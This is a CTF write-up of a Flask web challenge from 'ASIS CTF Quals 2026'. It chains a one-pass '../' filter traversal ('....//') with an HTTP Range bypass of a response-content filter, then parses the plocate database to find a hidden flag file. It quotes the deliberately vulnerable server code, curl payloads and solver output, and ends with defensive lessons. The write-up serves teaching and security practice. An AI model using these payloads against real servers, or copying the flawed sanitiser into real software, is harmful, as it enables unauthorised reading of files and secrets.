# Another Baby Web!

| | |
|---|---|
| **Event** | ASIS CTF Quals 2026 |
| **Category** | Web |
| **Difficulty** | Baby |
| **Service** | `http://91.107.191.73:29994/` |
| **Files** | [`challenge/app.py`](challenge/app.py) (served verbatim at `GET /`) |
| **Flag** | `ASIS{Baby_w3b_cha!!3nGe_$$$}` |
| **Formatted writeup** | [`writeup.html`](writeup.html) &middot; [read online](https://claude.ai/code/artifact/fde19472-0b15-45f4-8719-efaec70cb2a8) |

> Another Baby Web! Looks innocent. Probably isn't. 😈 Find the bug, grab the flag, and enjoy the "aha!" moment. 🚩

---

## TL;DR

`GET /inspect?path=...` is a local file read behind three checks, each with a bug:

1. **Path traversal — one-pass filter.** `resolve()` runs `user_path.replace("../", "")`
   exactly once, so `....//` collapses to `../` *after* the replacement and escapes the
   `/app` web-root.
2. **Content filter — `Range` bypass.** `bad_data()` rejects any response body containing
   `ASIS` or `lib`, but `send_file(..., conditional=True)` honours HTTP `Range`, and the app
   re-reads `response.get_data()` afterwards — so a `Range` header lets us skip the blocked
   bytes and window past the 64 KiB cap.
3. **`is_forbidden` (`/etc`, `/dev`, `/proc`, `/entrypoint.sh`) — genuinely airtight.** The
   hard-coded `/app` prefix makes a leading `//` impossible, so these are unreadable **red
   herrings**.

The two obvious flags (`/flag.txt`, `/app/flag.txt`) are **decoys**
(`ASIS{FAKE_FLAG_:)}`, `ASIS{an0ther_FAK3_FLAG_:)}`). The real flag sits in a
**randomly-named directory** — unguessable by brute force. The Ubuntu image ships
**`plocate`** (with an `updatedb` timer): its database at `/var/lib/plocate/plocate.db`
indexes the whole filesystem. We pull that DB over the LFI, parse it, and it hands us the
hidden path:

```
/app/811dd3cd18605ed6761d0466f47023d4/flag.txt   ->   ASIS{Baby_w3b_cha!!3nGe_$$$}
```

---

## 1. Reconnaissance

`GET /` returns the application's own source (it `open()`s `__file__`). It is a small Flask
app with two routes, `/` and `/inspect`. The read primitive:

```python
GENERIC_ERROR = {"error": "Access denied or file not found"}
CHALLENGE_DIR = "/app"
FORBIDDEN_PREFIXES = ("/etc", "/dev", "/proc", "/entrypoint.sh")
MAX_PATH_LEN = 110
MAX_CONTENT_LENGTH = 65536

def is_forbidden(resolved):
    for prefix in FORBIDDEN_PREFIXES:
        if resolved == prefix or resolved.startswith(prefix + "/"):
            return True
    return False

def resolve(user_path):
    if not isinstance(user_path, str):           return None
    if not user_path.startswith("/"):            return None
    if len(user_path) > MAX_PATH_LEN:            return None
    if "\x00" in user_path or "\\" in user_path: return None
    cleaned  = user_path.replace("../", "")      # (!) single pass
    resolved = os.path.normpath(CHALLENGE_DIR + cleaned)
    if is_forbidden(resolved):                   return None
    return resolved

def bad_data(data):
    BLOCKED = (bytes([65, 83, 73, 83]), bytes([108, 105, 98]))   # b"ASIS", b"lib"
    return any(marker in data for marker in BLOCKED)

@app.route("/inspect")
def inspect_file():
    resolved = resolve(request.args.get("path"))
    if resolved is None or not os.path.exists(resolved) or os.path.isdir(resolved):
        return jsonify(GENERIC_ERROR), 400
    response = send_file(resolved, conditional=True)     # (!) honours Range
    response.direct_passthrough = False
    body = response.get_data()
    if bad_data(body):                 return jsonify(GENERIC_ERROR), 400   # (!) checks body
    if len(body) > MAX_CONTENT_LENGTH: return jsonify(GENERIC_ERROR), 400
    return jsonify({"content": base64.b64encode(body).decode("ascii")}), 200
```

## 2. Bug #1 — traversal via a one-pass replace

`resolve()` strips `../` **once**, then `os.path.normpath("/app" + cleaned)`. Feeding
`....//` leaves `../` behind after the single replacement:

```
"/....//x"  --replace("../","")-->  "/../x"  --normpath("/app/../x")-->  "/x"
```

So `path=/....//<abs>` reads `/<abs>` (out of the web-root), while `path=/<x>` reads
`/app/<x>`. Confirmed by reading `/app/requirements.txt` (→ `flask==3.0.3`) and, out of
root, `/root/.bashrc` — which requires `+x` on the `0700` `/root`, proving the app runs as
**root**, i.e. it can read essentially anything not in a forbidden prefix.

## 3. Bug #2 — the content filter is a body check, so `Range` beats it

`bad_data()` inspects the returned bytes. A flag file (`ASIS{...}`) is blocked, but
`send_file(..., conditional=True)` processes an HTTP `Range` header and the app re-reads the
*ranged* body. Requesting `Range: bytes=4-` returns the flag without its `ASIS` prefix →
passes the filter. Two consequences we use throughout:

- **Skip blocked substrings** (`ASIS`, `lib`) by ranging around them.
- **Window past the 64 KiB `MAX_CONTENT_LENGTH`** by reading ≤ 60 KiB slices.
- **An exact existence oracle:** `Range: bytes=0-0` returns a single byte, which can never
  contain the 4-byte `ASIS` or 3-byte `lib`, so `200 ⇔ the file exists` regardless of its
  content. This removes the "not-found vs blocked-by-filter" ambiguity that plagues naive
  scanning.

```console
$ curl -s 'http://.../inspect?path=/flag.txt'                 -H 'Range: bytes=4-'
{"content":"e2FuMHRoZXJfRkFLM19GTEFHXzopfQo="}       # ASIS{an0ther_FAK3_FLAG_:)}
$ curl -s 'http://.../inspect?path=/....//app/flag.txt' ...   # ASIS{FAKE_FLAG_:)}
```

Both are explicitly **fake**.

## 4. Bug #3 that isn't — `is_forbidden` is airtight

The natural next thoughts — read `/entrypoint.sh` (the only forbidden *file*, so surely it
holds the secret) or `/proc/self/environ` (a flag env var) — both fail.
`is_forbidden` runs on the **normpath-canonical** string, and the only lexical way to open a
forbidden file while dodging the check is a leading double slash (`//entrypoint.sh` — same
inode, but `!= "/entrypoint.sh"`). Because `resolve()` always builds
`os.path.normpath("/app" + …)`, the result always begins with a single `/`. An exhaustive
offline search over the real `resolve()` confirms **zero** bypasses. These prefixes are
dead ends.

So the flag is a readable file at a path we must *discover*.

## 5. The "aha" — read the locate database

The two decoy flags are the only `flag.txt` files anywhere; no common flag/secret name in any
common directory exists (verified with the `bytes=0-0` oracle). Reading the apt/dpkg logs
(`/var/log/dpkg.log`, `/var/log/apt/history.log`) shows the box is **Ubuntu 24.04**, built
2026-08-28, with **`plocate` deliberately installed** and a `plocate-updatedb.timer` — an
unusual, deliberate inclusion.

`plocate` maintains `/var/lib/plocate/plocate.db`, a full filesystem index. `updatedb` ran
after the flag was placed, so the DB knows the hidden path. We just have to read and parse it.

### 5.1 Pulling the 333 KB binary over the LFI

The DB is `> 64 KiB` and, being binary, occasionally contains the byte sequences `lib`
(`6c 69 62`) / `ASIS` — mostly inside its embedded zstd **dictionary**, which is built from
common filename substrings. We read it in ≤ 60 KiB windows and, whenever a window returns
400, recurse by halving; single bytes can never trip the filters, so the recursion always
bottoms out on real bytes. Sizing the file first (via the `bytes=N-N` oracle) avoids reading
past EOF. Total: ~176 requests.

### 5.2 Parsing plocate.db

The header (`plocate` source `db.h`) gives everything we need:

| field | offset | value |
|---|---|---|
| magic | 0 | `\x00plocate` |
| num_docids | 20 | 287 |
| filename_index_offset | 32 | 61783 |
| zstd_dictionary_length | 44 | 1024 |
| zstd_dictionary_offset | 48 | 112 |

The filename index is `num_docids` little-endian `uint64` offsets, each pointing at a
**zstd frame compressed with the embedded dictionary**. Decompressing every frame with
`zstd -D <dict>` yields **9178** NUL-separated absolute paths — the whole filesystem listing.
Filtering for `flag` reveals the third, non-decoy entry:

```
/app/811dd3cd18605ed6761d0466f47023d4/flag.txt      <-- the real flag
/app/flag.txt                                        (decoy)
/flag.txt                                            (decoy)
```

(The full recovered listing is saved in [`solution/locate_filelist.txt`](solution/locate_filelist.txt).)

## 6. Grabbing the flag

The path is under `/app`, so `/inspect` reaches it directly; `Range: bytes=4-` skips the
`ASIS` prefix past `bad_data()`:

```console
$ curl -s 'http://.../inspect?path=/811dd3cd18605ed6761d0466f47023d4/flag.txt' \
        -H 'Range: bytes=4-'
{"content":"e0JhYnlfdzNiX2NoYSEhM25HZV8kJCR9"}       # {Baby_w3b_cha!!3nGe_$$$}
```

```
ASIS{Baby_w3b_cha!!3nGe_$$$}
```

The end-to-end script [`solution/solve.py`](solution/solve.py) performs every step above and
prints the flag:

```console
$ python3 solution/solve.py
[*] decoy /app/flag.txt   = 'ASIS{FAKE_FLAG_:)}'
[*] decoy /flag.txt       = 'ASIS{an0ther_FAK3_FLAG_:)}'
[*] downloading /var/lib/plocate/plocate.db ...
[*] got 333918 bytes; parsing ...
[*] locate db indexes 9178 paths
[*] flag-ish paths: ['/app/811dd3cd18605ed6761d0466f47023d4/flag.txt']
[+] FLAG: ASIS{Baby_w3b_cha!!3nGe_$$$}
```

## 7. Solution files

| File | Purpose |
|---|---|
| [`solution/solve.py`](solution/solve.py) | End-to-end: LFI read primitive, DB download, plocate parse, flag read (stdlib + `zstd` CLI) |
| [`solution/locate_filelist.txt`](solution/locate_filelist.txt) | The 9178-path filesystem listing recovered from `plocate.db` |
| [`challenge/app.py`](challenge/app.py) | The server source (served at `GET /`) |

## 8. Lessons

- **String-blacklist path sanitisation is not canonicalisation.** A one-pass
  `replace("../","")` is trivially defeated (`....//`); normalise with `realpath` and verify
  the result is *inside* the intended root.
- **Content filters live below `send_file`'s feature set.** With `conditional=True`, `Range`
  (and `If-Range`/`If-Modified-Since`) reshape the body *before* the app inspects it —
  blacklisting bytes in the response is not access control.
- **Security by obscurity fails against a file index.** A randomly-named flag directory is
  worthless once `plocate`/`mlocate`/`locate` (or `find`-able logs) can be read; don't ship an
  indexer that catalogues your secrets, and don't rely on unguessable paths.
- **Blocking `/proc` and `/entrypoint.sh` did nothing here** — the leak was an ordinary
  world-readable database. Defence must cover the whole readable filesystem, not a hand-picked
  denylist.
